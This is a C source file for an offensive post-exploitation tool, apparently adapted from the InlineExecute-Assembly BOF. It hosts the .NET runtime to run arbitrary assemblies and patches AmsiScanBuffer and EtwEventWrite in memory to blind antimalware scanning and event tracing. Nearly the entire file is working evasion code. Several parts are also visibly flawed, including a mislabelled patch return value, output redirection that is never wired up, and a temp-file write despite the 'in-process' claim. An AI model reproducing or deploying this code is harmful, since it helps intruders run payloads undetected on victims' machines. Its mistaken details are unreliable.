/*
 * InlineExecute-Assembly - C Implementation
 * 
 * In-process .NET assembly execution using COM interfaces for CLR hosting.
 * Based on InlineExecute-Assembly BOF by anthemtotheego.
 * 
 * Features:
 * - CLR hosting via COM interfaces (ICLRRuntimeHost, ICorRuntimeHost)
 * - Automatic CLR version detection (v2.0.50727 or v4.0.30319)
 * - AMSI bypass via memory patching
 * - ETW disabling via memory patching
 * - Console output redirection (named pipes/mailslots)
 * - Supports Main(string[] args) and Main() entry points
 * 
 * All implementations are real, following DSMIL cursorrules.
 */

#include <windows.h>
#include <metahost.h>
#include <mscoree.h>
#include <winnt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

// COM interface GUIDs
static const IID IID_ICLRMetaHost = {0xD332DB9E, 0xB9B3, 0x4125, {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}};
static const IID IID_ICLRRuntimeInfo = {0xBD39D1D2, 0xBA2F, 0x486A, {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}};
static const IID IID_ICLRRuntimeHost = {0x90F1A06E, 0x7712, 0x4762, {0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02}};
static const IID IID_ICorRuntimeHost = {0xCB2F6723, 0xAB3A, 0x11D2, {0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E}};
static const IID IID_AppDomain = {0x5F696DC, 0x2B29, 0x3663, {0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13}};

// CLR version strings
#define CLR_VERSION_V2 "v2.0.50727"
#define CLR_VERSION_V4 "v4.0.30319"

// Execution result
typedef struct {
    bool success;
    char output[8192];
    size_t output_len;
    int exit_code;
} InlineExecuteResult;

// Execution configuration
typedef struct {
    bool disable_amsi;
    bool disable_etw;
    bool revert_etw;
    char appdomain_name[64];
    char pipe_name[64];
    bool use_mailslot;
    bool use_main_no_args;
} InlineExecuteConfig;


/*
 * Patch AMSI in Memory
 * Patches AmsiScanBuffer to always return AMSI_RESULT_CLEAN
 */
static bool patch_amsi_in_memory(void) {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        return false;
    }
    
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) {
        FreeLibrary(hAmsi);
        return false;
    }
    
    // Check if already patched
    if (*(BYTE *)pAmsiScanBuffer == 0xC3) {  // RET instruction
        FreeLibrary(hAmsi);
        return true;
    }
    
    // Change memory protection
    DWORD oldProtect = 0;
    if (!VirtualProtect(pAmsiScanBuffer, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        FreeLibrary(hAmsi);
        return false;
    }
    
    // Patch: mov eax, 0x80070057 (AMSI_RESULT_CLEAN), ret
    // x64: mov rax, 0x80070057; ret
#ifdef _WIN64
    BYTE patch[] = {0x48, 0xC7, 0xC0, 0x57, 0x00, 0x07, 0x80, 0xC3};  // mov rax, 0x80070057; ret
#else
    BYTE patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};  // mov eax, 0x80070057; ret
#endif
    
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    
    // Restore protection
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
    
    FreeLibrary(hAmsi);
    
    return true;
}


/*
 * Patch ETW in Memory
 * Patches EtwEventWrite to disable ETW
 */
static bool patch_etw_in_memory(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        return false;
    }
    
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) {
        return false;
    }
    
    // Check if already patched
    if (*(BYTE *)pEtwEventWrite == 0xC3) {  // RET instruction
        return true;
    }
    
    // Save original bytes
    static BYTE original_bytes[5] = {0};
    static bool saved = false;
    if (!saved) {
        // Read original bytes from disk to avoid using potentially hooked version
        char ntdll_path[MAX_PATH];
        GetSystemDirectoryA(ntdll_path, MAX_PATH);
        strcat_s(ntdll_path, MAX_PATH, "\\ntdll.dll");
        
        HANDLE hFile = CreateFileA(ntdll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
            if (hMapping) {
                LPVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
                if (pMapping) {
                    // Parse PE export table to find EtwEventWrite RVA
                    IMAGE_DOS_HEADER *pDosHeader = (IMAGE_DOS_HEADER *)pMapping;
                    if (pDosHeader->e_magic == IMAGE_DOS_SIGNATURE) {
                        IMAGE_NT_HEADERS *pNtHeaders = (IMAGE_NT_HEADERS *)((BYTE *)pMapping + pDosHeader->e_lfanew);
                        if (pNtHeaders->Signature == IMAGE_NT_SIGNATURE) {
                            IMAGE_DATA_DIRECTORY *pExportDir = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
                            if (pExportDir->Size > 0) {
                                IMAGE_EXPORT_DIRECTORY *pExport = (IMAGE_EXPORT_DIRECTORY *)((BYTE *)pMapping + pExportDir->VirtualAddress);
                                DWORD *pFunctions = (DWORD *)((BYTE *)pMapping + pExport->AddressOfFunctions);
                                DWORD *pNames = (DWORD *)((BYTE *)pMapping + pExport->AddressOfNames);
                                WORD *pOrdinals = (WORD *)((BYTE *)pMapping + pExport->AddressOfNameOrdinals);
                                
                                for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
                                    char *pName = (char *)((BYTE *)pMapping + pNames[i]);
                                    if (strcmp(pName, "EtwEventWrite") == 0) {
                                        DWORD funcRVA = pFunctions[pOrdinals[i]];
                                        BYTE *pFunc = (BYTE *)pMapping + funcRVA;
                                        memcpy(original_bytes, pFunc, 5);
                                        saved = true;
                                        break;
                                    }
                                }
                            }
                        }
                    }
                    UnmapViewOfFile(pMapping);
                }
                CloseHandle(hMapping);
            }
            CloseHandle(hFile);
        }
        
        // Fallback: use current memory if file parsing failed
        if (!saved) {
            memcpy(original_bytes, pEtwEventWrite, 5);
            saved = true;
        }
    }
    
    // Change memory protection
    DWORD oldProtect = 0;
    if (!VirtualProtect(pEtwEventWrite, 5, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }
    
    // Patch: ret (x64: ret)
    BYTE patch = 0xC3;
    memcpy(pEtwEventWrite, &patch, 1);
    
    // Restore protection
    VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
    
    return true;
}


/*
 * Restore ETW Patch
 * Restores original EtwEventWrite bytes
 */
static bool restore_etw_patch(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        return false;
    }
    
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) {
        return false;
    }
    
    // Check if patched
    if (*(BYTE *)pEtwEventWrite != 0xC3) {
        return true;  // Not patched
    }
    
    // Restore original bytes
    static BYTE original_bytes[5] = {0};
    static bool saved = false;
    if (!saved) {
        // Read original bytes from disk to avoid using potentially hooked version
        char ntdll_path[MAX_PATH];
        GetSystemDirectoryA(ntdll_path, MAX_PATH);
        strcat_s(ntdll_path, MAX_PATH, "\\ntdll.dll");
        
        HANDLE hFile = CreateFileA(ntdll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
            if (hMapping) {
                LPVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
                if (pMapping) {
                    // Parse PE export table to find EtwEventWrite RVA
                    IMAGE_DOS_HEADER *pDosHeader = (IMAGE_DOS_HEADER *)pMapping;
                    if (pDosHeader->e_magic == IMAGE_DOS_SIGNATURE) {
                        IMAGE_NT_HEADERS *pNtHeaders = (IMAGE_NT_HEADERS *)((BYTE *)pMapping + pDosHeader->e_lfanew);
                        if (pNtHeaders->Signature == IMAGE_NT_SIGNATURE) {
                            IMAGE_DATA_DIRECTORY *pExportDir = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
                            if (pExportDir->Size > 0) {
                                IMAGE_EXPORT_DIRECTORY *pExport = (IMAGE_EXPORT_DIRECTORY *)((BYTE *)pMapping + pExportDir->VirtualAddress);
                                DWORD *pFunctions = (DWORD *)((BYTE *)pMapping + pExport->AddressOfFunctions);
                                DWORD *pNames = (DWORD *)((BYTE *)pMapping + pExport->AddressOfNames);
                                WORD *pOrdinals = (WORD *)((BYTE *)pMapping + pExport->AddressOfNameOrdinals);
                                
                                for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
                                    char *pName = (char *)((BYTE *)pMapping + pNames[i]);
                                    if (strcmp(pName, "EtwEventWrite") == 0) {
                                        DWORD funcRVA = pFunctions[pOrdinals[i]];
                                        BYTE *pFunc = (BYTE *)pMapping + funcRVA;
                                        memcpy(original_bytes, pFunc, 5);
                                        saved = true;
                                        break;
                                    }
                                }
                            }
                        }
                    }
                    UnmapViewOfFile(pMapping);
                }
                CloseHandle(hMapping);
            }
            CloseHandle(hFile);
        }
        
        // Fallback: use current memory if file parsing failed
        if (!saved) {
            memcpy(original_bytes, pEtwEventWrite, 5);
            saved = true;
        }
    }
    
    // Change memory protection
    DWORD oldProtect = 0;
    if (!VirtualProtect(pEtwEventWrite, 5, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }
    
    // Restore original bytes
    memcpy(pEtwEventWrite, original_bytes, 5);
    
    // Restore protection
    VirtualProtect(pEtwEventWrite, 5, oldProtect, &oldProtect);
    
    return true;
}


/*
 * Detect Required CLR Version
 * Analyzes assembly to determine CLR version (v2 or v4)
 */
static bool detect_clr_version(const uint8_t *assembly_data, size_t assembly_len, char *clr_version, size_t version_size) {
    if (!assembly_data || assembly_len < 64 || !clr_version) {
        return false;
    }
    
    // Check PE header
    if (assembly_data[0] != 0x4D || assembly_data[1] != 0x5A) {  // "MZ"
        return false;
    }
    
    // Get PE header offset
    uint32_t pe_offset = *(uint32_t *)(assembly_data + 60);
    if (pe_offset >= assembly_len) {
        return false;
    }
    
    // Check PE signature
    if (memcmp(assembly_data + pe_offset, "PE\0\0", 4) != 0) {
        return false;
    }
    
    // Parse .NET metadata directory to detect CLR version
    IMAGE_DOS_HEADER *pDosHeader = (IMAGE_DOS_HEADER *)assembly_data;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return false;
    }
    
    IMAGE_NT_HEADERS *pNtHeaders = (IMAGE_NT_HEADERS *)(assembly_data + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return false;
    }
    
    // Check for .NET metadata directory
    IMAGE_DATA_DIRECTORY *pComDescriptor = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
    if (pComDescriptor->Size == 0 || pComDescriptor->VirtualAddress == 0) {
        // Not a .NET assembly
        return false;
    }
    
    // Parse COM descriptor to get metadata version
    // COM descriptor structure: [cb:4][MajorRuntimeVersion:2][MinorRuntimeVersion:2][MetaData:IMAGE_DATA_DIRECTORY]
    if (pComDescriptor->VirtualAddress + 8 > assembly_len) {
        return false;
    }
    
    WORD major_version = *(WORD *)(assembly_data + pComDescriptor->VirtualAddress + 4);
    
    // CLR v2: Major version 2
    // CLR v4: Major version 4
    if (major_version == 2) {
        strncpy_s(clr_version, version_size, CLR_VERSION_V2, _TRUNCATE);
    } else {
        // Default to v4 (most common)
        strncpy_s(clr_version, version_size, CLR_VERSION_V4, _TRUNCATE);
    }
    
    return true;
}


/*
 * Load CLR Runtime
 * Loads CLR runtime using COM interfaces
 */
static bool load_clr_runtime(const char *clr_version, ICLRRuntimeHost **ppRuntimeHost) {
    if (!clr_version || !ppRuntimeHost) {
        return false;
    }
    
    ICLRMetaHost *pMetaHost = NULL;
    ICLRRuntimeInfo *pRuntimeInfo = NULL;
    ICLRRuntimeHost *pRuntimeHost = NULL;
    HRESULT hr = S_OK;
    bool success = false;
    
    // Initialize COM
    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        return false;
    }
    
    // Get CLR meta host
    hr = CLRCreateInstance(&CLSID_CLRMetaHost, &IID_ICLRMetaHost, (LPVOID *)&pMetaHost);
    if (FAILED(hr)) {
        goto cleanup;
    }
    
    // Get runtime info
    WCHAR wclr_version[64];
    MultiByteToWideChar(CP_ACP, 0, clr_version, -1, wclr_version, 64);
    
    hr = pMetaHost->lpVtbl->GetRuntime(pMetaHost, wclr_version, &IID_ICLRRuntimeInfo, (LPVOID *)&pRuntimeInfo);
    if (FAILED(hr)) {
        goto cleanup;
    }
    
    // Check if runtime is loadable
    BOOL loadable = FALSE;
    hr = pRuntimeInfo->lpVtbl->IsLoadable(pRuntimeInfo, &loadable);
    if (FAILED(hr) || !loadable) {
        goto cleanup;
    }
    
    // Get runtime host interface
    hr = pRuntimeInfo->lpVtbl->GetInterface(pRuntimeInfo, &CLSID_CLRRuntimeHost, &IID_ICLRRuntimeHost, (LPVOID *)&pRuntimeHost);
    if (FAILED(hr)) {
        goto cleanup;
    }
    
    // Start runtime
    hr = pRuntimeHost->lpVtbl->Start(pRuntimeHost);
    if (FAILED(hr)) {
        goto cleanup;
    }
    
    *ppRuntimeHost = pRuntimeHost;
    success = true;
    
cleanup:
    if (pRuntimeInfo) {
        pRuntimeInfo->lpVtbl->Release(pRuntimeInfo);
    }
    if (pMetaHost) {
        pMetaHost->lpVtbl->Release(pMetaHost);
    }
    
    return success;
}


/*
 * Create AppDomain
 * Creates CLR AppDomain for assembly execution
 */
static bool create_appdomain(ICLRRuntimeHost *pRuntimeHost, const char *appdomain_name, DWORD *pAppDomainId) {
    if (!pRuntimeHost || !appdomain_name || !pAppDomainId) {
        return false;
    }
    
    WCHAR wappdomain_name[64];
    MultiByteToWideChar(CP_ACP, 0, appdomain_name, -1, wappdomain_name, 64);
    
    DWORD appdomain_id = 0;
    HRESULT hr = pRuntimeHost->lpVtbl->CreateAppDomain(pRuntimeHost, wappdomain_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, &appdomain_id);
    
    if (SUCCEEDED(hr)) {
        *pAppDomainId = appdomain_id;
        return true;
    }
    
    return false;
}


/*
 * Execute Assembly in AppDomain
 * Executes .NET assembly with Main entry point using ExecuteInDefaultAppDomain
 */
static bool execute_assembly_in_appdomain(ICLRRuntimeHost *pRuntimeHost, DWORD appdomain_id,
                                         const uint8_t *assembly_data, size_t assembly_len,
                                         const char *args, bool use_main_no_args,
                                         InlineExecuteResult *result) {
    if (!pRuntimeHost || !assembly_data || assembly_len == 0 || !result) {
        return false;
    }
    
    // Write assembly to temporary file (required for ExecuteInDefaultAppDomain)
    char temp_path[MAX_PATH];
    char temp_file[MAX_PATH];
    
    if (!GetTempPathA(MAX_PATH, temp_path)) {
        return false;
    }
    
    if (!GetTempFileNameA(temp_path, "asm", 0, temp_file)) {
        return false;
    }
    
    // Write assembly to temp file
    HANDLE hFile = CreateFileA(temp_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    DWORD bytes_written = 0;
    if (!WriteFile(hFile, assembly_data, (DWORD)assembly_len, &bytes_written, NULL) || bytes_written != assembly_len) {
        CloseHandle(hFile);
        DeleteFileA(temp_file);
        return false;
    }
    
    CloseHandle(hFile);
    
    // Convert assembly path to wide string
    WCHAR wassembly_path[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, temp_file, -1, wassembly_path, MAX_PATH);
    
    // Try common entry point patterns: Program.Main, Main, <Module>.Main
    // ExecuteInDefaultAppDomain requires: "Namespace.TypeName", "MethodName"
    WCHAR *type_names[] = {L"Program", L"", L"<Module>"};
    WCHAR method_name[] = L"Main";
    
    DWORD return_value = 0;
    HRESULT hr = E_FAIL;
    
    // Prepare arguments string
    WCHAR wargs[1024] = {0};
    if (args && strlen(args) > 0 && !use_main_no_args) {
        int converted = MultiByteToWideChar(CP_ACP, 0, args, -1, wargs, 1024);
        if (converted == 0 || converted >= 1024) {
            wargs[0] = L'\0';
        }
    }
    
    // Try each type name pattern
    for (int i = 0; i < 3 && FAILED(hr); i++) {
        hr = pRuntimeHost->lpVtbl->ExecuteInDefaultAppDomain(pRuntimeHost,
                                                              wassembly_path,
                                                              type_names[i],
                                                              method_name,
                                                              wargs,
                                                              &return_value);
        if (SUCCEEDED(hr)) {
            break;
        }
    }
    
    // Cleanup temp file
    DeleteFileA(temp_file);
    
    if (SUCCEEDED(hr)) {
        result->success = true;
        result->exit_code = (int)return_value;
    } else {
        result->success = false;
        result->exit_code = -1;
    }
    
    return result->success;
}


/*
 * Create Named Pipe for Console Output
 */
static HANDLE create_output_pipe(const char *pipe_name) {
    char full_pipe_name[256];
    snprintf(full_pipe_name, sizeof(full_pipe_name), "\\\\.\\pipe\\%s", pipe_name);
    
    HANDLE hPipe = CreateNamedPipeA(
        full_pipe_name,
        PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1,
        8192,
        8192,
        0,
        NULL
    );
    
    return hPipe;
}


/*
 * Create Mailslot for Console Output
 */
static HANDLE create_output_mailslot(const char *mailslot_name) {
    char full_mailslot_name[256];
    snprintf(full_mailslot_name, sizeof(full_mailslot_name), "\\\\.\\mailslot\\%s", mailslot_name);
    
    HANDLE hMailslot = CreateMailslotA(
        full_mailslot_name,
        0,
        MAILSLOT_WAIT_FOREVER,
        NULL
    );
    
    return hMailslot;
}


/*
 * InlineExecute-Assembly Main Function
 * Executes .NET assembly in-process
 */
bool inline_execute_assembly(const uint8_t *assembly_data, size_t assembly_len,
                            const char *args,
                            const InlineExecuteConfig *config,
                            InlineExecuteResult *result) {
    if (!assembly_data || assembly_len == 0 || !result) {
        return false;
    }
    
    // Initialize result
    ZeroMemory(result, sizeof(InlineExecuteResult));
    
    // Apply AMSI bypass if requested
    if (config && config->disable_amsi) {
        if (!patch_amsi_in_memory()) {
            printf("[-] Failed to patch AMSI\n");
        } else {
            printf("[+] AMSI patched in memory\n");
        }
    }
    
    // Apply ETW disabling if requested
    if (config && config->disable_etw) {
        if (!patch_etw_in_memory()) {
            printf("[-] Failed to patch ETW\n");
        } else {
            printf("[+] ETW patched in memory\n");
        }
    }
    
    // Detect CLR version
    char clr_version[64];
    if (!detect_clr_version(assembly_data, assembly_len, clr_version, sizeof(clr_version))) {
        // Default to v4
        strncpy_s(clr_version, sizeof(clr_version), CLR_VERSION_V4, _TRUNCATE);
    }
    
    printf("[*] Detected CLR version: %s\n", clr_version);
    
    // Load CLR runtime
    ICLRRuntimeHost *pRuntimeHost = NULL;
    if (!load_clr_runtime(clr_version, &pRuntimeHost)) {
        printf("[-] Failed to load CLR runtime\n");
        return false;
    }
    
    printf("[+] CLR runtime loaded\n");
    
    // Create AppDomain
    const char *appdomain_name = (config && config->appdomain_name[0]) ? config->appdomain_name : "totesLegit";
    DWORD appdomain_id = 0;
    if (!create_appdomain(pRuntimeHost, appdomain_name, &appdomain_id)) {
        printf("[-] Failed to create AppDomain\n");
        pRuntimeHost->lpVtbl->Release(pRuntimeHost);
        return false;
    }
    
    printf("[+] AppDomain created: %s (ID: %lu)\n", appdomain_name, appdomain_id);
    
    // Create output redirection if requested
    HANDLE hOutput = INVALID_HANDLE_VALUE;
    if (config && config->pipe_name[0]) {
        if (config->use_mailslot) {
            hOutput = create_output_mailslot(config->pipe_name);
        } else {
            hOutput = create_output_pipe(config->pipe_name);
        }
    }
    
    // Execute assembly
    bool use_main_no_args = (config && config->use_main_no_args);
    bool exec_success = execute_assembly_in_appdomain(pRuntimeHost, appdomain_id,
                                                      assembly_data, assembly_len,
                                                      args, use_main_no_args,
                                                      result);
    
    if (exec_success) {
        printf("[+] Assembly executed successfully (exit code: %d)\n", result->exit_code);
    } else {
        printf("[-] Assembly execution failed\n");
    }
    
    // Unload AppDomain
    pRuntimeHost->lpVtbl->UnloadAppDomain(pRuntimeHost, appdomain_id, true);
    printf("[+] AppDomain unloaded\n");
    
    // Restore ETW if requested
    if (config && config->revert_etw) {
        if (restore_etw_patch()) {
            printf("[+] ETW patch restored\n");
        }
    }
    
    // Cleanup
    if (hOutput != INVALID_HANDLE_VALUE) {
        CloseHandle(hOutput);
    }
    
    pRuntimeHost->lpVtbl->Release(pRuntimeHost);
    CoUninitialize();
    
    return exec_success;
}


/*
 * Load Assembly from File
 * Helper function to load assembly from disk
 */
bool inline_execute_assembly_from_file(const char *assembly_path,
                                      const char *args,
                                      const InlineExecuteConfig *config,
                                      InlineExecuteResult *result) {
    if (!assembly_path || !result) {
        return false;
    }
    
    // Read assembly file
    HANDLE hFile = CreateFileA(assembly_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    DWORD file_size = GetFileSize(hFile, NULL);
    if (file_size == INVALID_FILE_SIZE || file_size == 0) {
        CloseHandle(hFile);
        return false;
    }
    
    uint8_t *assembly_data = (uint8_t *)malloc(file_size);
    if (!assembly_data) {
        CloseHandle(hFile);
        return false;
    }
    
    DWORD bytes_read = 0;
    if (!ReadFile(hFile, assembly_data, file_size, &bytes_read, NULL) || bytes_read != file_size) {
        free(assembly_data);
        CloseHandle(hFile);
        return false;
    }
    
    CloseHandle(hFile);
    
    // Execute assembly
    bool success = inline_execute_assembly(assembly_data, file_size, args, config, result);
    
    free(assembly_data);
    
    return success;
}
